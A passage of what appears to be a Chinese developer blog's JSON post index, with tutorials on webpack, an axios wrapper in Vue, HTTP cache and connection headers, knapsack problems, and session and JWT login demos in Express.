3000!\\n&#x27;);&#125;); 现在，添加一个 npm script，以使我们更方便地运行 server： package.json 1234567 &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;watch&quot;: &quot;webpack --watch&quot;, &quot;start&quot;: &quot;webpack serve --open&quot;,+ &quot;server&quot;: &quot;node server.js&quot;, &quot;build&quot;: &quot;webpack&quot; &#125;, 现在，在 terminal(终端) 中执行 npm run server","categories":[{"name":"webpack","slug":"webpack","permalink":"https://coloey.github.io/categories/webpack/"}],"tags":[]},{"title":"Vue中封装axios请求","slug":"Vue中封装axios请求","date":"2022-04-11T02:01:47.000Z","updated":"2022-04-11T02:24:02.431Z","comments":true,"path":"2022/04/11/Vue中封装axios请求/","link":"","permalink":"https://coloey.github.io/2022/04/11/Vue%E4%B8%AD%E5%B0%81%E8%A3%85axios%E8%AF%B7%E6%B1%82/","excerpt":"","text":"在src文件夹中新创建一个utils文件夹，创建index.js来实现axios实例，并配置拦截器 index.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import axios from &#x27;axios&#x27;import &#123;ElLoading,ElMessage&#125; from &#x27;element-plus&#x27;import router from &quot;../router&quot;import store from &quot;../store&quot;import CHAT from &quot;../client&quot;//const pendingMap=new Map();//axios.defaults.headers.post[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;;//创建一个axios实例var instance=axios.create(&#123; baseURL:&quot;http://127.0.0.1:3007&quot;, timeout: 10000,//设置超时 headers:&#123; &#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;, &#125;&#125;)let loading;//多次请求时let requestCount=0;//显示Loadingconst showLoading=()=&gt;&#123; if(requestCount===0&amp;&amp;!loading)&#123;//第一次发送请求并且没有loading加载loaing loading=ElLoading.service(&#123; text:&#x27;Loading&#x27;, background:&#x27;rgba(0,0,0,0.7)&#x27;, spinner:&#x27;el-icon-loading&#x27;, &#125;) &#125; requestCount++;//多次请求&#125;//隐藏loadingconst hideLoading=()=&gt;&#123; requestCount--; if(requestCount===0)&#123; loading.close()//直到请求都结束Loading才关闭 &#125;&#125;//请求拦截器instance.interceptors.request.use((config)=&gt;&#123; showLoading() //每次发送请求前判断是否存在token如果存在则在header加上token const token=window.localStorage.getItem(&#x27;token&#x27;); token&amp;&amp;(config.headers.Authorization=token) return config;&#125;,(error)=&gt;&#123; Promise.reject(error);&#125;)//响应拦截器instance.interceptors.response.use((response)=&gt;&#123; hideLoading() //响应成功 // console.log(&#x27;拦截器报错&#x27;) // console.log(response) const status=response.data.status; if(status!=1)&#123; switch(status)&#123; case 0: //响应成功后如果是登录成功有token把token存储在本地 if(response.data.token!=undefined)window.localStorage.setItem(&#x27;token&#x27;,response.data.token); break; case 200://获取用户信息成功后存储在localStorage里和store console.log(response.data); store.commit(&quot;saveUserInfo&quot;,(response.data).data); window.localStorage.setItem(&#x27;userInfo&#x27;,JSON.stringify((response.data).data)); break; case 401://登录过期跳转到登录页面 case 201://退出登录清空token跳转登录页面 window.localStorage.removeItem(&#x27;token&#x27;); window.localStorage.removeItem(&#x27;userInfo&#x27;) CHAT.logout(); router.push(&quot;/login&quot;); &#125; if(response.data.message)ElMessage.success(response.data.message) return Promise.resolve(response); &#125; else &#123; ElMessage.error(response.data.message); return Promise.reject(response); &#125; &#125;,(error)=&gt;&#123; console.log(error); //响应错误 if(error.response&amp;&amp;error.response.status)&#123; return Promise.reject(error) &#125; return Promise.reject(error);&#125;)export default instance; request.jsrequest.js中使用axios实例 12345678910111213141516171819202122232425262728import instance from &quot;./index&quot;const axios=(&#123; method, url, data, config&#125;)=&gt;&#123; method=method.toLowerCase(); if(method==&#x27;post&#x27;)&#123; return instance.post(url,data,&#123;...config&#125;) &#125;else if(method==&#x27;get&#x27;)&#123; return instance.get(url,&#123; params:data, ...config &#125;) &#125;else if(method==&#x27;delete&#x27;)&#123; return instance.delete(url,&#123; params:data, ...config &#125;) &#125;else if(method==&#x27;put&#x27;)&#123; return instance.put(url,data,&#123;...config&#125;) &#125;else&#123; console.log(&#x27;未知的方法&#x27;+method) return false &#125;&#125;export default axios api.jsapi.js用来封装各种类型的请求 默认情况下，axios 将 JavaScript 对象序列化为JSON. 要改为以格式发送数据application/x-www-form-urlencoded，我用的是qs.stringfy将数据转换，其他方法可以参考官网 []: https://axios-http.com/docs/urlencoded 1234567891011121314151617181920212223242526272829303132333435363738import axios from &quot;./request&quot;import qs from &quot;qs&quot;export const login=(data)=&gt;&#123; return axios(&#123; url:&#x27;/api/login&#x27;, method:&#x27;post&#x27;, data:qs.stringify(data), &#125;)&#125;export const register=(data)=&gt;&#123; return axios(&#123; url:&#x27;/api/register&#x27;, method:&#x27;post&#x27;, data:qs.stringify(data) &#125;)&#125;export const logout=()=&gt;&#123; return axios(&#123; url:&#x27;/api/logout&#x27;, method:&#x27;post&#x27;, &#125;)&#125;export const getUserInfo=()=&gt;&#123; return axios(&#123; url:&#x27;/my/getUserInfo&#x27;, method:&#x27;get&#x27;, &#125;)&#125;export const updatePassword=(data)=&gt;&#123; return axios(&#123; url:&#x27;/my/updatePassword&#x27;, method:&#x27;post&#x27;, data:qs.stringify(data) &#125;)&#125;","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Vue","slug":"Node/Vue","permalink":"https://coloey.github.io/categories/Node/Vue/"}],"tags":[]},{"title":"打包资源","slug":"打包资源","date":"2022-04-10T09:30:58.000Z","updated":"2022-04-11T06:50:45.747Z","comments":true,"path":"2022/04/10/打包资源/","link":"","permalink":"https://coloey.github.io/2022/04/10/%E6%89%93%E5%8C%85%E8%B5%84%E6%BA%90/","excerpt":"","text":"打包样式资源1234567891011121314151617181920212223242526272829303132333435363738394041const &#123;resolve&#125; =require(&#x27;path&#x27;)module.exports=&#123; entry:&#x27;./src/index.js&#x27;, //输出 output:&#123; //输出文件名 filename:&#x27;built.js&#x27;, //输出路径,_dirname node.js的变量，代表当前文件的目录绝对路径 path:resolve(__dirname,&#x27;build&#x27;) &#125;, //loader配置 module:&#123; rules:[ //匹配哪些文件 &#123;test:/\\.css$/, //使用哪些loader use:[ //use数组中loader执行顺序从右到左，从下到上一次执行 //创建style标签，将js中的样式资源插入进行，添加到head中生效 &#x27;style-loader&#x27;, //将css文件变成commonjs模块加载到js中，里面内容是样式字符串 &#x27;css-loader&#x27; ]&#125;, &#123; test:/\\.less$/, use:[ &#x27;style-loader&#x27;, &#x27;css-loader&#x27;, &#x27;less-loader&#x27;,//将less文件编译成css文件 ] &#125; ] &#125;, plugins:[ ], mode:&#x27;development&#x27;&#125; 打包html资源12345678910111213141516171819202122232425262728293031323334353637383940414243444546const &#123;resolve&#125; =require(&#x27;path&#x27;)const HtmlWebpackPlugin=require(&#x27;html-webpack-plugin&#x27;)module.exports=&#123; entry:&#x27;./src/index.js&#x27;, //输出 output:&#123; //输出文件名 filename:&#x27;built.js&#x27;, //输出路径,_dirname node.js的变量，代表当前文件的目录绝对路径 path:resolve(__dirname,&#x27;build&#x27;) &#125;, //loader配置 module:&#123; rules:[ //匹配哪些文件 &#123;test:/\\.css$/, //使用哪些loader use:[ //use数组中loader执行顺序从右到左，从下到上一次执行 //创建style标签，将js中的样式资源插入进行，添加到head中生效 &#x27;style-loader&#x27;, //将css文件变成commonjs模块加载到js中，里面内容是样式字符串 &#x27;css-loader&#x27; ]&#125;, &#123; test:/\\.less$/, use:[ &#x27;style-loader&#x27;, &#x27;css-loader&#x27;, &#x27;less-loader&#x27;,//将less文件编译成css文件 ] &#125; ] &#125;, plugins:[ //html-webpack-plugin默认会创建一个空的HTML,自动引入打包输出的所有资源（js/css） //需求：需要有结构的HTML文件 new HtmlWebpackPlugin(&#123; //模板比对&#x27;src/index.html&#x27;文件，并自动引入打包输出的所有资源(js/css) template:&#x27;./src/index.html&#x27; &#125;) ], mode:&#x27;development&#x27;&#125; 打包图片 html-loader 以相同的方式处理 &lt;img src=&quot;./my-image.png&quot; /&gt;。需要npm i html-wepack-plugin []: https://webpack.docschina.org/loaders/html-loader 12345678910111213141516//处理图片 &#123; test:/\\.(png|svg|jpg|jpeg|gif)$/i, type:&#x27;asset/resource&#x27;, &#125;, //将html导出为字符串 &#123; test:/\\.html$/i, loader:&quot;html-loader&quot;, &#125;, //处理字体 &#123; test:/\\.(woff|woff2|eot|ttf|otf)$/i, type:&#x27;asset/resource&#x27; &#125;, 打包xml,csv文件可以加载的有用资源还有数据，如 JSON 文件，CSV、TSV 和 XML。类似于 NodeJS，JSON 支持实际上是内置的，也就是说 import Data from &#39;./data.json&#39; 默认将正常运行。要导入 CSV、TSV 和 XML，你可以使用 csv-loader 和 xml-loader。让我们处理加载这三类文件： 1npm install --save-dev csv-loader xml-loader 12345678&#123; test: /\\.(csv|tsv)$/i, use: [&#x27;csv-loader&#x27;], &#125;, &#123; test: /\\.xml$/i, use: [&#x27;xml-loader&#x27;], &#125;, 打包toml,yaml,json5通过使用 自定义 parser 替代特定的 webpack loader，可以将任何 toml、yaml 或 json5 文件作为 JSON 模块导入。 1npm install toml yamljs json5 --save-dev 12345678910111213141516171819202122232425 const toml=require(&#x27;toml&#x27;)const yaml=require(&#x27;yamljs&#x27;)const json5=require(&#x27;json5&#x27;)...&#123; test: /\\.toml$/i, type: &#x27;json&#x27;, parser: &#123; parse: toml.parse, &#125;, &#125;, &#123; test: /\\.yaml$/i, type: &#x27;json&#x27;, parser: &#123; parse: yaml.parse, &#125;, &#125;, &#123; test: /\\.json5$/i, type: &#x27;json&#x27;, parser: &#123; parse: json5.parse, &#125;, &#125;, 清理/dist文件在每次构建前清理 /dist 文件夹，这样只会生成用到的文件。让我们使用 output.clean 配置项实现这个需求。 12345678910111213141516171819const path = require(&#x27;path&#x27;); const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;); module.exports = &#123; entry: &#123; index: &#x27;./src/index.js&#x27;, print: &#x27;./src/print.js&#x27;, &#125;, plugins: [ new HtmlWebpackPlugin(&#123; title: &#x27;Output Management&#x27;, &#125;), ], output: &#123; filename: &#x27;[name].bundle.js&#x27;, path: path.resolve(__dirname, &#x27;dist&#x27;),+ clean: true, &#125;, &#125;;","categories":[{"name":"webpack","slug":"webpack","permalink":"https://coloey.github.io/categories/webpack/"}],"tags":[]},{"title":"wepack五个核心概念","slug":"wepack五个核心概念","date":"2022-04-10T04:05:22.000Z","updated":"2022-04-10T09:32:42.293Z","comments":true,"path":"2022/04/10/wepack五个核心概念/","link":"","permalink":"https://coloey.github.io/2022/04/10/wepack%E4%BA%94%E4%B8%AA%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/","excerpt":"","text":"Entry:入口（Entry)指示Webpack以哪个文件为入口起点开始打包 Output: 输出（output)指示Webpack打包后的资源bundle输出到哪里，以及如何命名 Loader:Loader让Webpack能够去处理那些非JavaScript文件（webpack自身只理解JavaScript) loader 用于对模块的源代码进行转换。loader 可以使你在 import 或”加载”模块时预处理文件。因此，loader 类似于其他构建工具中“任务(task)”，并提供了处理前端构建步骤的强大方法。loader 可以将文件从不同的语言（如 TypeScript）转换为 JavaScript，或将内联图像转换为 data URL。loader 甚至允许你直接在 JavaScript 模块中 import CSS文件！ Plugins:插件(Plugins)可以用于执行范围更广的任务，插件的范围包括从打包优化到压缩，一直到重新定义环境中的变量等 Mode:模式（Mode）指示Webpack使用相应模式的配置 选项 描述 特点 development 会将process.env.NODE_ENV的值设为development,启用NamedChunksPlugin和NamedModulesPlugin 能让代码在本地调试运行的环境 production 会将 process.env.NODE_ENV 的值设为 production。启用 FlagDependencyUsagePlugin, FlagIncludedChunksPlugin, ModuleConcatenationPlugin, NoEmitOnErrorsPlugin, OccurrenceOrderPlugin, SideEffectsFlagPlugin 和 UglifyJsPlugin 能让代码优化上线运行的环境 运行指令开发环境webpack ./src/index.js -o ./build/build.js –mode=development:webpack会以./src/index.js为入口打包文件，打包后输出到./build/build.js，整体打包环境，是开发环境 生成环境webpack ./src/index.js-o ./build/build.js –mode=production,webpack会以./src/index.js为入口打包文件，打包后输出到./build/build.js，整体打包环境，是生产环境 结论 webpack能处理js/json资源，不能处理css/img等其他资源 生产环境和开发环境将ES6模块化编译成浏览器能识别的模块化 生产环境比开发环境多一个压缩的js代码","categories":[{"name":"webpack","slug":"webpack","permalink":"https://coloey.github.io/categories/webpack/"}],"tags":[]},{"title":"HTTP首部字段","slug":"HTTP通用首部字段","date":"2022-04-09T08:13:43.000Z","updated":"2022-04-11T13:35:32.923Z","comments":true,"path":"2022/04/09/HTTP通用首部字段/","link":"","permalink":"https://coloey.github.io/2022/04/09/HTTP%E9%80%9A%E7%94%A8%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5/","excerpt":"","text":"HTTP报文首部HTTP请求报文由请求行（方法，URI，HTTP版本），HTTP首部字段等部分构成。 HTTP响应报文由状态行（HTTP版本，状态码（数字和原因短语））HTTP首部字段3部分构成。 4种HTTP首部字段类型通用首部字段：请求报文和响应报文都会使用的首部 请求首部字段：从客户端向服务端发送报文时使用的首部，补充了请求的附加内容，客户端信息，响应内容相关优先级等信息 响应首部字段：从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息 实体首部字段：针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息 HTTP/1.1通用首部字段Cache-Control通过指定首部字段Cache-Control的指令，就能操作缓存的工作机制。 Cache-Control:private,max-age=0,no-cache 缓存请求指令： 指令 参数 说明 no-cache 无 强制向源服务器再次验证 no-store 无 不缓存请求或响应的任何内容 max-age=([秒]) 必需 响应的最大Age值 max-stale=([秒]) 可省略 接收已过期的响应 min-fresh=[秒] 必需 期望在指定时间内的响应仍有效 no-transform 无 代理不接更改媒体类型 only-if-cached 无 从缓存中获取资源 cache-extension 新指令标记（token) 缓存响应指令 指令 参数 说明 public 无 可向任意方提供响应的缓存 private 可省略 仅向特定用户返回响应 no-cache 可省略 缓存前必须先确认其有效性 no-store 无 不缓存请求或响应的任何内容 no-transform 无 代理不接更改媒体类型 must-revalidate 无 可缓存但必须再向服务器进行确认 proxy-revalidate 无 要求中间缓存服务器对缓存的响应有效性再进行确认 max-age=[秒] 必需 响应的最大Age值 s-maxage=[秒] 必需 公共缓存服务器响应的最大Age值 cache-extension - 新指令标记（token) no-cache指令Cache-Control:no-cache 使用no-cache指令的目的是为了防止从缓存中返回过期的资源，缓存会向源服务器进行有效期的确认后处理资源 客户端：发送的请求中包含no-cache指令，则表示客户端将不会接收缓存过的响应。于是“中间”缓存服务器必须把客户端请求转发给源服务器 服务器：如果服务器返回的响应中包含no-cache指令，那么缓存服务器不能对资源进行缓存，源服务器以后也不再对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作 Cache-Control:no-cache=Location 由服务器返回的响应中，若报文首部字段Cache-Control中对no-cache字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。相反，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数 no-store指令Cache-Control:no-store 当使用no-store指令时，暗示请求（和对应的响应）或响应中包含机密信息，因此该指令规定缓存不能在本地存储请求或响应的任何一部分 s-maxage指令Cache-Control:s-maxage=604800(单位：秒) s-maxage指令的功能和max-age指令相同，不同点在于s-maxage指令只适用于供多位用户使用的公共缓存服务器，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。 当使用s-maxage指令后，则直接忽略对Expires首部字段及max-age指令的处理 max-age指令Cache-Control:max-age=604800(单位：秒) 客户端：当客户端发送的请求中包含max-age指令时，如果判定缓存时间的数值比·1指定时间的数值更小，那么客户端就接收缓存的资源。当指定的max-age=0，那么缓存服务器通常将请求转发给源服务器 服务端：服务器返回的响应中包含max-age指令，缓存服务器将不对资源的有效性再作确认，而max-zge数值代表资源保存为缓存的最长时间 ⚠应用HTTP/1.1版本的缓存服务器在遇到同时存在Expires首部字段的情况时，会优先处理max-age指令,而忽略Expires首部字段，而HTTP/1.0版本的缓存服务器则相反，max-age指令被忽略 min-fresh指令Cache-Control:min-fresh=60 min-fresh指令要求缓存服务器返回至少还未过指定时间的缓存资源。 max-stale指令Cache-Control:max-stale=3600 使用max-stale指示缓存资源，即使过期也照常接收 如果指令未指定参数值，那么无论过多久，客户端都会接收响应；如果指令中指定了具体数值，那么即使过期，只要仍处于max-stale指定的时间内仍旧会被客户端接收 only-if-cached指令Cache-Control:only-if-cached 表示客户端仅在缓存服务器本地缓存目标资源的情况下才要求其返回。该指令要求服务器不重新加载响应，也不再次确认资源有效性。若请求缓存服务器的本地缓存无响应，则返回状态码504 Gateway Timeout must-revalidate指令Cache-Control:must-revalidate 代理向源服务器再次验证即将返回的响应缓存目前是否仍然有效。如果代理无法连通服务器再次活期有效资源，缓存必须给客户端一条504状态码 使用must-revalidate指令忽略请求的max-stale指令，即使首部使用了max-stale，也不会有效果 proxy-revalidate指令Cache-Control：proxy-revalidate proxy-revalidate要求所有缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性 no-transform指令Cache-Control：no-transform 无论·是在请求还是响应中使用，缓存都不能改变实体主体的媒体类型，这样可防止代理压缩图片等类似操作 Cache-Control扩展cache-control token Cache-Control:private,community=”UCI” 通过cache-extension标记可以扩展Cache-Control首部字段内的指令。如例子，Cache-Control首部字段本身没有community这个指令。借助extensions tokens实现了该指令的添加。如果缓存服务器无法理解这个新指令就会直接忽略 Connection作用： 控制不再转发给代理的首部字段 管理持久连接 Connection:不再转发的首部字段名 控制不再转发给代理的首部字段在客户端发送请求和服务器返回响应内，使用Connection首部字段，可控制不再转发给代理的首部字段 管理持久连接Connection:close HTTP/1.1版本的默认连接是持久连接，为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，指定Connection首部字段为Close HTTP/1.1之前的版本默认连接是非持久连接。因此，如果想要在旧版本的HTTP协议上维持持续连接，则需要指定Connection为Kepp-Alive PragmaPragma是HTTP/1.1之前版本的历史遗留字段，仅作为与HTTP/1.0的向后兼容而定义 Pragma:no-cache 该首部字段属于通用首部字段，但只用在客户端发送请求中。客户端要求所有的中间服务器不返回缓存的资源。所有中间服务器如果都能以HTTP/1.1为基准，那直接采用Cache-Control:no-cache指定缓存的处理方式是最为理想的。但要整体掌握中间服务器使用的HTTP协议版本不现实，发送请求一般同时包含两个首部字段 Cache-Control:no-cache Pragma:no-cache Trailer首部字段Trailer会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在HTTP/1.1版本分块传输编码时 Trailer:Expires —(报文主体)— Expires:Tue,28 Sep 2004 23:59:59 GMT Transfer-Encoding规定了传输报文主体时采用的编码方式 HTTP/1.1的传输编码方式仅对分块传输编码有效 Upgrade Upgrade用于检测HTTP协议及其他协议是否可使用更高的版本进行同心，其参数值用来指定一个完全不同的通信协议 12345678客户端=》服务器GET/index.html HTTP/1.1Upgrade:TLS/1.0Connection:Upgrade服务器=》客户端HTTP/1.1 101 Switching ProtocolsUpgrade:TLS/1.0,HTTP/1.1Connection:Upgrade Connection的值被指定为Upgrade,Upgrade的首部字段产生作用的Upgrade对象仅限于客户端和邻接服务器之间。因此使用首部字段Upgrade时需要额外指定Connection为Upgrade Via使用Via是为了追踪客户端和服务器之间的请求和响应报文的传输路径 报文经过代理或网关时，会现在首部字段Via中附加该服务器的信息，然后再进行转发。Via不仅用于追踪报文的转发，还可避免请求回环的发生，所以必须在经过代理时附加该首部字段内容 WarningHTTP/1.1的Warning首部是从HTTP/1.0的响应首部（Retry-After)演变过来的，该首部会告知用户一些与缓存相关的问题的警告 &amp;eg: Warning:113 gw.hackr.jp:8080 “Heuristic expiration” Tue,03 Jul=&gt;2012 05:09:44 GMT Warning:【警告码】【警告主机：端口号】“【警告内容】”（【日期时间】） HTTP/1.1警告码 警告码 警告内容 说明 110 Response is stale(响应已过期) 代理返回已过期的资源 111 Revalidation failed(再验证失败) 代理验证资源有效性时失败（服务器无法到达等原因 112 Disconnection operation(断开连接操作) 代理与互联网连接故意切断 113 Heuristic expiration(试探性过期) 响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下） 199 Miscellaneous warning(杂项警告) 任意警告内容 214 Transformation applied(使用了转换) 代理对内容编码或媒体类型等执行了某些处理时 299 Miscellaneous persistent warning(持久杂项警告) 任意警告内容","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://coloey.github.io/categories/HTTP/"}],"tags":[]},{"title":"背包问题","slug":"背包问题","date":"2022-04-04T04:01:42.000Z","updated":"2022-04-08T09:19:01.103Z","comments":true,"path":"2022/04/04/背包问题/","link":"","permalink":"https://coloey.github.io/2022/04/04/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/","excerpt":"","text":"01背包：有限物品数量 二维01背包问题，两个for循环可以交换顺序，内层for循环方向可以顺序循环 一维01背包问题：因为物品数量有限，内层for循环不能重复取，必须倒序，两个for循环可以交换顺序 完全背包问题：物品可以重复取 二维：for循环可以交换顺序，内层for循环必须顺序，因为物品可以重复取 一维：for循环可以交换顺序，内层for循环必须顺序，因为物品可以重复取 求方法数：dp[j]+=dp[j-nums[i]] 一维：求组合数：先遍历物品再遍历背包 求排列数：先遍历背包再遍历物品","categories":[{"name":"算法","slug":"算法","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"前后端身份认证","slug":"前后端身份认证","date":"2022-03-21T06:10:19.000Z","updated":"2022-04-12T09:45:43.489Z","comments":true,"path":"2022/03/21/前后端身份认证/","link":"","permalink":"https://coloey.github.io/2022/03/21/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/","excerpt":"","text":"不同身份认证方案：服务端渲染推荐使用Session认证机制 前后端分离推荐使用JWT认证机制 Session认证机制 Cooike:Cookie是存储在用户浏览器中一段不超过4kb的字符串，它由一个名称（Name),y一个值(Value)和几个用于控制Cookie有效期，安全性，使用范围的可选属性组成 不同域名下的Cookie各自独立，每当客户端发起请求时，会自动把当前域名下所有未过期的Cookie一同发送到服务器。 Cookie的几大特性： 自动发送 域名独立 过期时限 4kb限制 Cookie在身份认证中的作用： 客户端第一次请求服务器时，服务器通过响应头的形式，向客户端发送一个身份认证的Cookie，客户端会自动将Cookie保存在浏览器中，随后，当客户端浏览器每次请求服务器时浏览器会自动将身份认证相关的Cookie，通过请求头的形式发送给服务器，服务器即可验证客户端身份 Cookie具有不安全性 由于Cookie是存储在浏览器中的，因此浏览器也提供了读写Cookie的API，因此Cookie很容易被伪造，不具有安全性，因此Cookie不能存放重要隐私数据 Session工作原理： 客户端把用户ID和密码等登陆信息放入报文的实体部分，通常是以POST请求发送给服务器，而这时使用HTTPS通信来进行HTML表单画面的显示和用户输入数据的发送 服务器会发放用以识别用户的Session ID,通过验证从客户端送过来的登录信息进行身份认证，人后把用户认证状态与Session ID绑定后记录在服务器端，向客户端返回响应时，会在首部字段Set-Cookie内写入Sessin ID,为避免SessionId被盗，可在Cookie中加入httponly属性 客户端接收到从服务器发来的Session ID后，会将其作为Cookie保存哎本地，下次向服务器发送请求时，浏览器自动发送Cookie,服务器通过验证接收到的Session ID识别用户和其认证状态 Session认证需要配合Cookie实现，由于Cookie默认不支持跨域访问，所以当涉及前端跨域请求后端接口时需要做额外配置。因此当前端请求后端接口不涉及跨域请求时推荐使用Session身份认证机制，否则使用JWT认证 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061const express=require(&#x27;express&#x27;);const session=require(&#x27;express-session&#x27;);const cors=require(&#x27;cors&#x27;);const bodyParser=require(&#x27;body-parser&#x27;)//var formParser=require(&#x27;express-formidable&#x27;)const app=express();app.use(cors());app.use( session(&#123; secret:&#x27;xiaoqi&#x27;, resave:false, saveUninitialized:true &#125;))//托管静态页面app.use(express.static(&#x27;./pages&#x27;));//自定义解析Post提交过来的表单数据app.use(bodyParser.urlencoded(&#123;extended:false&#125;))app.use(bodyParser.json())//登录API接口app.post(&#x27;/api/login&#x27;,(req,res)=&gt;&#123; //判断用户提交的登录信息是否正确 console.log(req.body) if(req.body.username!==&quot;admin&quot;||req.body.password!==&quot;888888&quot;)&#123; return res.send(&#123;status:1,msg:&#x27;登录失败&#x27;&#125;) &#125; //登录成功则把信息存储在Session中 console.log(req.body); req.session.user=req.body;//用户登录信息 req.session.islogin=true;//用户登录状态 res.send(&#123;status:0,msg:&#x27;登录成功&#x27;&#125;)&#125;)//获取用户姓名的接口app.get(&#x27;/api/username&#x27;,(req,res)=&gt;&#123; //从Session中获取用户姓名响应给客户端 if(!req.session.islogin)&#123; return res.send(&#123;status:1,msg:&#x27;fail&#x27;&#125;) &#125; res.send(&#123; status:0, msg:&#x27;success&#x27;, username:req.session.user.username, &#125;)&#125;)//退出登录的接口app.post(&#x27;/api/logout&#x27;,(req,res)=&gt;&#123; //清空当前客户端的session信息 req.session.destroy() res.send(&#123; status:0, msg:&#x27;退出登录成功&#x27; &#125;)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;) JWT认证机制：工作原理 jwt组成部分： 头部.有效荷载.签名 Header.PayLoad.Signature 客户端收到服务器返回的JWT后，通常会将它存储在localStorage或者sessionStorage中，此后客户端每次与服务端通信，都要带上这个JWT的字符串，进行身份认证，推荐把JWT放在Http请求头的Authorization字段中 Authorization：Bearer 在Express中使用JWT 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869const express=require(&#x27;express&#x27;);const app=express();const cors=require(&#x27;cors&#x27;);//导入用于生成jwt字符串的包const jwt=require(&#x27;jsonwebtoken&#x27;);//导入用于将客户端发送过来的JWT字符串解析还原成JSON对象的包const expressJWT=require(&quot;express-jwt&quot;);//秘钥的本质是字符串const secretkey=&#x27;xiaochunzuishuai^_^&#x27;;//以/api/开头的不用权限，配置成功了express-jwt这个中间件，就可以把解析出来的用户信息挂载到req.user上app.use(expressJWT(&#123; secret:secretkey, algorithms: [&#x27;HS256&#x27;], &#125;).unless(&#123;path:[/^\\/api\\//]&#125;))const bodyParser=require(&#x27;body-parser&#x27;)app.use(cors());//托管静态页面app.use(express.static(&#x27;./pages&#x27;));//自定义解析Post提交过来的表单数据app.use(bodyParser.urlencoded(&#123;extended:false&#125;))app.use(bodyParser.json())//登录API接口app.post(&#x27;/api/login&#x27;,(req,res)=&gt;&#123; //判断用户提交的登录信息是否正确 const userInfo=req.body; if(userInfo.username!==&quot;admin&quot;||userInfo.password!==&quot;888888&quot;)&#123; return res.send(&#123;status:1,msg:&#x27;登录失败&#x27;&#125;) &#125; //登录成功生成JWT字符串，通过token属性响应给客户端 res.send(&#123; satus:0, msg:&#x27;success&#x27;, //不要把密码加密到token字符串中 token:jwt.sign(&#123;username:userInfo.username&#125;,secretkey,&#123;expiresIn:&#x27;100s&#x27;&#125;), data:req.user &#125;)&#125;)//有权限的接口,配置成功了express-jwt这个中间件，有权限的接口就可以通过req.user获取解析出来的用户信息app.get(&#x27;/admin/getInfo&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0, msg:&#x27;success&#x27;, data:req.user &#125;)&#125;)//退出登录的接口app.post(&#x27;/api/logout&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0, msg:&#x27;退出登录成功&#x27; &#125;)&#125;)//配置全局错误处理中间件app.use((err,req,res,next)=&gt;&#123; //token解析失败导致的错误,Token过期或不合法 if(err.name===&#x27;UnauthorizedError&#x27;)&#123; return res.send(&#123;status:401,message:&#x27;无效的token&#x27;&#125;) &#125; //其他原因导致的错误 res.send(&#123;status:500,message:&#x27;未知错误&#x27;&#125;)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;)","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"Web开发模式","slug":"Web开发模式","date":"2022-03-21T05:52:34.000Z","updated":"2022-03-21T06:09:19.188Z","comments":true,"path":"2022/03/21/Web开发模式/","link":"","permalink":"https://coloey.github.io/2022/03/21/Web%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"Web开发模式：服务端渲染的Web开发模式服务器发送给客户端的HTML页面是通在服务器通过字符串的拼接动态生成的。因此客户端不需要通过Ajax技术额外请求页面的数据 优点： 前端耗时少，因为服务端通过动态生成HTML内容，浏览器只需要直接渲染页面即可，尤其是移动端，更省电 有利于SEO，服务器响应的是完整的HTML页面，所以爬虫更容易获取信息，有利于SEO 缺点： 占用服务器资源，如果请求较多，会对服务器造成一定压力 不利于前后端分离，开发效率低。使用服务端渲染，则无法进行分工合作，尤其对于前端复杂的项目，不利于羡慕高效开发 前后端分离的Web开发模式：依赖于Ajax技术，后端负责接口开发，前端使用Ajav=x调用接口的开发模式 优点： 开发体验好，前端专注于UI开发，后端专注于接口开发 用户体验好，Ajax技术的应用，提高用户的体验，轻松实现局部页面刷新 减轻服务端的渲染压力，页面最终是在浏览器中生成的 缺点： 不利于SEO，完整的HTML页面需要在客户端动态拼接，所有爬虫无法提取页面有效信息，解决方法：利用Vue,React等前端框架的SSR技术解决 如何选择Web开发模式： 看业务场景 主要功能是展示页面且没有复杂交互并且需要良好的SEO，用服务端渲染 后台管理项目等交互性强用前后端分离 